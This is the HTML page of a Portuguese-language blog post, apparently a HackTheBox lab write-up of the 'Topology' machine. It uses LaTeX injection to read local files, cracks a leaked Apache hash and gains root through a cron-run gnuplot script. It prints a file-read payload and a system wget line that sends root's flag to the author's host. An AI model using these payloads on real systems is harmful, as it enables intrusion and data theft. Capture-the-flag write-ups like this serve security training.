@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="pt" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>HackTheBox - Topology | tomiodarim</title>
+<meta name="keywords" content="write-up, hackthebox, machine, topology">
+<meta name="description" content="Topology é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código em uma aplicação de conversão de LaTeX para imagem para conseguir a senha do usuário e depois executar códigos como root por meio de uma tarefa do cron.
+Começando, como sempre, com um scan do nmap encontra-se duas portas abertas, 80 de uma aplicação web e 22 de SSH.
+Continuando o reconhecimento com um brute force de diretórios, porém não foi encontrado nada útil.">
+<meta name="author" content="Lucas Tomio Darim">
+<link rel="canonical" href="https://tomiodarim.io/posts/htb-topology/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5a101feaed2bc000d60de8365173a1aa6c75665853dcc863f92f59ea5ace5d74.css" integrity="sha256-WhAf6u0rwADWDeg2UXOhqmx1ZlhT3Mhj&#43;S9Z6lrOXXQ=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.20cbcab8eadb4b1c256e6db331b0130fc305cd882d8b91865e9b6473e8ec5c24.js" integrity="sha256-IMvKuOrbSxwlbm2zMbATD8MFzYgti5GGXptkc&#43;jsXCQ="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://tomiodarim.io/images/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://tomiodarim.io/images/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://tomiodarim.io/images/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://tomiodarim.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://tomiodarim.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="HackTheBox - Topology" />
+<meta property="og:description" content="Topology é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código em uma aplicação de conversão de LaTeX para imagem para conseguir a senha do usuário e depois executar códigos como root por meio de uma tarefa do cron.
+Começando, como sempre, com um scan do nmap encontra-se duas portas abertas, 80 de uma aplicação web e 22 de SSH.
+Continuando o reconhecimento com um brute force de diretórios, porém não foi encontrado nada útil." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tomiodarim.io/posts/htb-topology/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-11-04T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox - Topology"/>
+<meta name="twitter:description" content="Topology é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código em uma aplicação de conversão de LaTeX para imagem para conseguir a senha do usuário e depois executar códigos como root por meio de uma tarefa do cron.
+Começando, como sempre, com um scan do nmap encontra-se duas portas abertas, 80 de uma aplicação web e 22 de SSH.
+Continuando o reconhecimento com um brute force de diretórios, porém não foi encontrado nada útil."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://tomiodarim.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox - Topology",
+      "item": "https://tomiodarim.io/posts/htb-topology/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HackTheBox - Topology",
+  "name": "HackTheBox - Topology",
+  "description": "Topology é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código em uma aplicação de conversão de LaTeX para imagem para conseguir a senha do usuário e depois executar códigos como root por meio de uma tarefa do cron.\nComeçando, como sempre, com um scan do nmap encontra-se duas portas abertas, 80 de uma aplicação web e 22 de SSH.\nContinuando o reconhecimento com um brute force de diretórios, porém não foi encontrado nada útil.",
+  "keywords": [
+    "write-up", "hackthebox", "machine", "topology"
+  ],
+  "articleBody": "Topology é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código em uma aplicação de conversão de LaTeX para imagem para conseguir a senha do usuário e depois executar códigos como root por meio de uma tarefa do cron.\nComeçando, como sempre, com um scan do nmap encontra-se duas portas abertas, 80 de uma aplicação web e 22 de SSH.\nContinuando o reconhecimento com um brute force de diretórios, porém não foi encontrado nada útil. Utilizei a wordlist common.txt pois essa máquina estava muito lenta e às vezes não respondia as requests, então wordlists maiores eram inviáveis.\nA aplicação pode ser acessada direto pelo IP da máquina, sendo que a página principal é de um grupo de estudos de uma universidade. Logo no primeiro projeto do grupo há um link para uma página no subdomínio “latex.topology.htb”.\nAgora um segundo brute force para encontrar subdomínios da aplicação. Foi possível encontrar o dev e o stats. Para acessar esses e mais o latex é preciso adicionar o IP e os domínios ao arquivo de hosts local.\nA página que encontramos anteriormente na página inicial é uma aplicação que converte códigos de LaTeX para imagens png. Basta inserir o código na caixa de texto e clicar em “Generate” para ser redirecionado para a imagem gerada. Há um filtro para evitar que alguns códigos sejam inseridos, como por exemplo leitura e escrita de arquivos e execução de comandos no sistema operacional.\nSeguindo para os outros dois subdomínios encontrados, o stats apresenta duas imagens relativas ao processamento do servidor e da rede, já o dev possui autenticação.\nDepois de tentar muitos payloads diferentes consegui fazer a leitura do “/etc/passwd”, assim conseguindo um Local File Injection (LFI). Para isso foi utilizado o código abaixo, o comando “lstinputlisting” permite a inclusão de arquivos e não está sendo bloqueado pelo filtro.\n$\\lstinputlisting{/etc/passwd}$ Como é possível ler os arquivos locais da máquina, eu utilizei essa vulnerabilidade para ler o arquivo “.htpasswd” que armazena os usuários e hashes de autenticação do subdomínio dev. Assim obtendo o seguinte hash.\nEsse hash é do Apache e possui o código 1600 para o hashcat, então utilizando essa ferramenta quebrei o hash com a wordlist rockyou.txt, sendo a senha calculus20.\nAgora com o usuário e senha podemos acessar a página do subdomínio dev mas não há nada de interessante nela. E como o usuário reutilizou a senha para o seu acesso via SSH, conseguimos acesso à máquina e a primeira flag.\nCom a ferramenta pspy para análise dos processos da máquina encontra-se uma tarefa do cron do root para execução do gnuplot com todos os arquivos que possuem a extensão .plt que estejam no diretório /opt/gnuplot.\nO usuário vdaisley possui permissão de escrita e execução nesse diretório, mas não de leitura. Então qualquer arquivo com a extensão que colocarmos alí será executado como root no gnuplot.\nPara execução de comandos do sistema operacional pelo gnuplot precisa utilizar a função system. Para ser mais fácil ao invés de conseguir uma shell como root eu apenas me enviei a flag. Para isso eu fiz com requisição http para a minha máquina passando como diretório o conteúdo do arquivo da flag, conforme o código abaixo, mas qualquer comando poderia ser executado.\nsystem \"wget http://10.10.14.87:8080/$(cat /root/root.txt)\" Assim conseguimos a flag de root e finalizamos a máquina.\n",
+  "wordCount" : "556",
+  "inLanguage": "pt",
+  "datePublished": "2023-11-04T00:00:00Z",
+  "dateModified": "2023-11-04T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Lucas Tomio Darim"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://tomiodarim.io/posts/htb-topology/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "tomiodarim",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://tomiodarim.io/images/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://tomiodarim.io/" accesskey="h" title="tomiodarim (Alt + H)">tomiodarim</a>
+            
+        </div>
+        <div class="logo">
+            <ul id="menu">
+                <li>
+                    <a href="https://tomiodarim.io/" title="home">
+                        <span>home</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://tomiodarim.io/whoami/" title="whoami">
+                        <span>whoami</span>
+                    </a>
+                </li>
+                <li>
+                    <a href="https://tomiodarim.io/tags/" title="tags">
+                        <span>tags</span>
+                    </a>
+                </li>
+            </ul>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title">
+      HackTheBox - Topology
+    </h1>
+    <div class="post-meta"><span title='2023-11-04 00:00:00 +0000 UTC'>4 de novembro de 2023</span>
+
+</div>
+  </header> 
+  <div class="post-content"><p>Topology é uma máquina Linux de dificuldade fácil. Nela é preciso abusar de uma vulnerabilidade de injeção de código em uma aplicação de conversão de LaTeX para imagem para conseguir a senha do usuário e depois executar códigos como root por meio de uma tarefa do cron.</p>
+<p><img loading="lazy" src="/images/htb-topology/0.png" alt="Banner"  />
+</p>
+<hr>
+<p>Começando, como sempre, com um scan do nmap encontra-se duas portas abertas, 80 de uma aplicação web e 22 de SSH.</p>
+<p><img loading="lazy" src="/images/htb-topology/1.png" alt="Nmap"  />
+</p>
+<p>Continuando o reconhecimento com um brute force de diretórios, porém não foi encontrado nada útil. Utilizei a wordlist common.txt pois essa máquina estava muito lenta e às vezes não respondia as requests, então wordlists maiores eram inviáveis.</p>
+<p><img loading="lazy" src="/images/htb-topology/2.png" alt="Directory brute-force"  />
+</p>
+<p>A aplicação pode ser acessada direto pelo IP da máquina, sendo que a página principal é de um grupo de estudos de uma universidade. Logo no primeiro projeto do grupo há um link para uma página no subdomínio &ldquo;latex.topology.htb&rdquo;.</p>
+<p><img loading="lazy" src="/images/htb-topology/3.png" alt="Página principal"  />
+</p>
+<p>Agora um segundo brute force para encontrar subdomínios da aplicação. Foi possível encontrar o dev e o stats. Para acessar esses e mais o latex é preciso adicionar o IP e os domínios ao arquivo de hosts local.</p>
+<p><img loading="lazy" src="/images/htb-topology/4.png" alt="Subdomains brute-force"  />
+</p>
+<p>A página que encontramos anteriormente na página inicial é uma aplicação que converte códigos de LaTeX para imagens png. Basta inserir o código na caixa de texto e clicar em &ldquo;Generate&rdquo; para ser redirecionado para a imagem gerada. Há um filtro para evitar que alguns códigos sejam inseridos, como por exemplo leitura e escrita de arquivos e execução de comandos no sistema operacional.</p>
+<p><img loading="lazy" src="/images/htb-topology/5.png" alt="latex"  />
+</p>
+<p>Seguindo para os outros dois subdomínios encontrados, o stats apresenta duas imagens relativas ao processamento do servidor e da rede, já o dev possui autenticação.</p>
+<p><img loading="lazy" src="/images/htb-topology/7.png" alt="dev"  />
+</p>
+<p>Depois de tentar muitos payloads diferentes consegui fazer a leitura do &ldquo;/etc/passwd&rdquo;, assim conseguindo um Local File Injection (LFI). Para isso foi utilizado o código abaixo, o comando &ldquo;lstinputlisting&rdquo; permite a inclusão de arquivos e não está sendo bloqueado pelo filtro.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-latex" data-lang="latex"><span class="line"><span class="cl"><span class="s">$</span><span class="nv">\lstinputlisting</span><span class="nb">{</span><span class="o">/</span><span class="nb">etc</span><span class="o">/</span><span class="nb">passwd}</span><span class="s">$</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/images/htb-topology/8.png" alt="LFI via latex"  />
+</p>
+<p>Como é possível ler os arquivos locais da máquina, eu utilizei essa vulnerabilidade para ler o arquivo &ldquo;.htpasswd&rdquo; que armazena os usuários e hashes de autenticação do subdomínio dev. Assim obtendo o seguinte hash.</p>
+<p><img loading="lazy" src="/images/htb-topology/9.png" alt=".htpasswd"  />
+</p>
+<p>Esse hash é do Apache e possui o código 1600 para o hashcat, então utilizando essa ferramenta quebrei o hash com a wordlist rockyou.txt, sendo a senha calculus20.</p>
+<p><img loading="lazy" src="/images/htb-topology/10.png" alt="Hashcat"  />
+</p>
+<p>Agora com o usuário e senha podemos acessar a página do subdomínio dev mas não há nada de interessante nela. E como o usuário reutilizou a senha para o seu acesso via SSH, conseguimos acesso à máquina e a primeira flag.</p>
+<p><img loading="lazy" src="/images/htb-topology/11.png" alt="user.txt"  />
+</p>
+<p>Com a ferramenta pspy para análise dos processos da máquina encontra-se uma tarefa do cron do root para execução do gnuplot com todos os arquivos que possuem a extensão .plt que estejam no diretório /opt/gnuplot.</p>
+<p><img loading="lazy" src="/images/htb-topology/12.png" alt="pspy"  />
+</p>
+<p>O usuário vdaisley possui permissão de escrita e execução nesse diretório, mas não de leitura. Então qualquer arquivo com a extensão que colocarmos alí será executado como root no gnuplot.</p>
+<p><img loading="lazy" src="/images/htb-topology/13.png" alt="gnuplot"  />
+</p>
+<p>Para execução de comandos do sistema operacional pelo gnuplot precisa utilizar a função system. Para ser mais fácil ao invés de conseguir uma shell como root eu apenas me enviei a flag. Para isso eu fiz com requisição http para a minha máquina passando como diretório o conteúdo do arquivo da flag, conforme o código abaixo, mas qualquer comando poderia ser executado.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gnuplot" data-lang="gnuplot"><span class="line"><span class="cl"><span class="k">system</span> <span class="s">&#34;wget http://10.10.14.87:8080/$(cat /root/root.txt)&#34;</span>
+</span></span></code></pre></div><p><img loading="lazy" src="/images/htb-topology/14.png" alt="root.txt"  />
+</p>
+<p>Assim conseguimos a flag de root e finalizamos a máquina.</p>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      tags:
+      <li><a href="https://tomiodarim.io/tags/write-up/">write-up</a></li>
+      <li><a href="https://tomiodarim.io/tags/hackthebox/">hackthebox</a></li>
+      <li><a href="https://tomiodarim.io/tags/machine/">machine</a></li>
+      <li><a href="https://tomiodarim.io/tags/topology/">topology</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>Lucas Tomio Darim · &copy; 2023</span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
